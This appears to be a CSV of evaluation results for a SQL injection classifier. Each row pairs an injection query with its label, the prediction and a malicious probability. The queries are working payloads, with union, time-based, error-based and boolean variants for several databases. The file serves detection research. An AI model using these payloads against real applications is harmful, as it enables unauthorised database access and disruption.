Query,Label,predicted,correct,malicious_probability
select case when 8867  =  7630 then 1 else null end--,1,1,True,0.9691341259778987
-4331  )   as inpx where 9804  =  9804 union all select 9804#,1,1,True,0.9456364521765183
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",1,1,True,0.9910243867427718
"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450",1,1,True,0.9732324203024897
"-4596"" union all select 5761#",1,1,True,0.914014789802132
"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,True,0.9936060713913223
"-6419 union all select 7008,7008,7008,7008,7008--",1,1,True,0.9648592399716909
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,True,0.987051179233201
-8828   )    )    as ospo where 2141  =  2141 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,True,0.9668996189581841
"-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --",1,1,True,0.9911693590012189
1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,True,0.9994015482933407
"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",1,1,True,0.9822827498930782
"-6431' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'ixix' like 'ixix",1,1,True,0.9891165850841938
"1%""   )    )    union all select null,null,null,null,null,null,null,null--",1,1,True,0.974646725470539
"-7553%"" or 3571  =  2886",1,1,True,0.9001319044534973
1'||  (  select 'ydvg' from dual where 7108  =  7108,1,1,True,0.9871426559605192
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",1,1,True,0.9814443350355674
1'||  (  select 'adoe' from dual where 7662  =  7662,1,1,True,0.9916577364245709
"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",1,1,True,0.9667755710559482
1'+  (  select pagd where 2484  =  2484,1,1,True,0.925907920953158
"1'   )    )    as lizu where 7691  =  7691 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9945408659519969
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1,True,0.9791377909506311
"1'+  (  select hspl where 4530  =  4530 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9775544365239927
"1',  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,1,True,0.9751587212980996
1   )    )    as cwyb where 3633  =  3633,1,1,True,0.9643363405312069
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1,1,True,0.8842366343416403
"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",1,1,True,0.978459169857048
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1,True,0.9917684867271722
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""jfgk"" like ""jfgk",1,1,True,0.9893729318762458
"-5073""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""kbab"" like ""kbab",1,1,True,0.9763576326529908
select   (  case when   (  4774  =  1535  )   then 4774 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,True,0.9875223283009406
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,1,1,True,0.9982991542884061
1' in boolean mode  )   order by 1#,1,1,True,0.97647795322269
"1  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,True,0.981634883512232
"1%""  )   and 8626  =  3626#",1,1,True,0.9508363662018888
"iif  (  5214  =  7412,1,1/0  )  ",1,1,True,0.9866782939332134
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'nuil' like 'nuil",1,1,True,0.9772247907021239
"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,True,0.9983714703391743
1'||  (  select 'rhcv' where 6228  =  6228,1,1,True,0.9836953158089705
select pg_sleep  (  5  )   and    (    (   4382  =  4382,1,1,True,0.9951618722289368
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'oacz'  =  'oacz",1,1,True,0.9793949479153998
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",1,1,True,0.9648914573979372
"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",1,1,True,0.9522606705731428
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1,1,True,0.9971887407497694
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,1,True,0.9932394766062438
"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1,1,True,0.9787244752207999
"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",1,1,True,0.9442383045446928
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",1,1,True,0.9811017294564267
"1   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   5776  =  5776",1,1,True,0.9750673912475875
"1   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  9401  =  9401",1,1,True,0.9734247274232684
1 rlike sleep  (  5  )  -- muhp,1,1,True,0.9999719848211733
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,1,1,True,0.9993520894770155
1  )   as ratg where 3033  =  3033 union all select null--,1,1,True,0.968644389256498
-7404' where 1536  =  1536 order by 1#,1,1,True,0.9673370651847658
"1'  )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,True,0.9696155500061739
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,True,0.9992422144029813
"1 union all select null,null,null--",1,1,True,0.9825093040056037
1'  )   as rhvm where 1420  =  1420,1,1,True,0.9918955802607867
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'edcm' like 'edcm",1,1,True,0.9738077587586879
-2756' where 6156  =  6156 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1,True,0.9905047910344712
1'  )   union all select null#,1,1,True,0.9771472400379496
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",1,1,True,0.9921967797972744
"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",1,1,True,0.9778775379265868
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,1,True,0.9698343433707716
"-8129'   )    )     )   union all select 4531,4531,4531#",1,1,True,0.9609994198651116
"1""  )   union all select null,null,null,null,null,null,null,null,null#",1,1,True,0.8936218657456166
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,1,True,0.9728847348739332
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",1,1,True,0.9893301392543666
1'  )   as gogu where 4338  =  4338 union all select null#,1,1,True,0.9518927216726976
"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1,1,True,0.9673383970282683
"1,  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,1,True,0.9558950231845563
"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""ieuj"" like ""ieuj",1,1,True,0.9306576614630625
1 where 2384  =  2384 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,True,0.9965060704755755
"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",1,1,True,0.9904692373806459
"1""  )   union all select null,null,null,null,null,null,null,null,null--",1,1,True,0.9697554501970893
"1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--",1,1,True,0.9709589950647729
"1"" where 9725  =  9725",1,1,True,0.935258060221983
"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",1,1,True,0.9636999359147628
"1%"" union all select null,null,null,null,null,null--",1,1,True,0.9729459833141485
"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9853842781413223
"1""  )   as ipxg where 4031  =  4031 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,True,0.9806531575355275
"1'  )   as jysm where 8961  =  8961 union all select null,null#",1,1,True,0.9812815951102568
1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,1,True,0.9940483983193609
"1""  )   and sleep  (  5  )   and   (  ""ytof""  =  ""ytof",1,1,True,0.9889074732144902
"1""  )   as pobe where 1704  =  1704",1,1,True,0.9464924822819225
"1"" where 9332  =  9332 union all select null,null,null,null,null,null,null,null,null--",1,1,True,0.9595574366591331
-2432'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'ejhp'  =  'ejhp,1,1,True,0.9675370333989551
-8641%' order by 1--,1,1,True,0.9988830457175688
"-3249'   )    )     )   union all select 6309,6309#",1,1,True,0.9253698388451469
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'yqbo'  =  'yqbo,1,1,True,0.9975115779821379
1'  )   as nexa where 6740  =  6740,1,1,True,0.9859017545484032
"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""rvub"" like ""rvub",1,1,True,0.8077101898054019
"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",1,1,True,0.9826467603200478
"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",1,1,True,0.9692299330630015
"1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1,1,True,0.9743290653390824
1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,1,True,0.9968120258788676
"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",1,1,True,0.9348169760453372
-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,1,True,0.9839415428622735
"1' and make_set  (  8403  =  8403,8899  )   and 'niux'  =  'niux",1,1,True,0.9891829392762898
end and   (  4610  =  4610,1,1,True,0.9304196314749605
"1   )    )    union all select null,null,null--",1,1,True,0.9837811354390573
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,1,1,True,0.9979734221170775
"1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#",1,1,True,0.9880037522985946
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'fowu' like 'fowu",1,1,True,0.9340692485397769
1'  )   where 5280  =  5280 and 4595  =  4595#,1,1,True,0.9792251092941409
"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.9966824532655174
1  )   where 3565  =  3565 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,True,0.9993202112038719
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,1,1,True,0.9964058512046565
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,1,True,0.997014500453245
"1"" where 9760  =  9760 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,True,0.9989174248169298
"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",1,1,True,0.9863347308889102
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""squx"" like ""squx",1,1,True,0.9709981803892351
"1""   )    )     )   and 4967  =  8866 and    (    (     (  ""jzyn"" like ""jzyn",1,1,True,0.9486518221967553
"1""  )   as oztl where 6655  =  6655 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.9881066457225055
if  (  7899  =  7899  )   select 7899 else drop function zbbp--,1,1,True,0.9024936429093311
"1""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""uwdz""  =  ""uwdz",1,1,True,0.9916701313213179
"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",1,1,True,0.9756175532837684
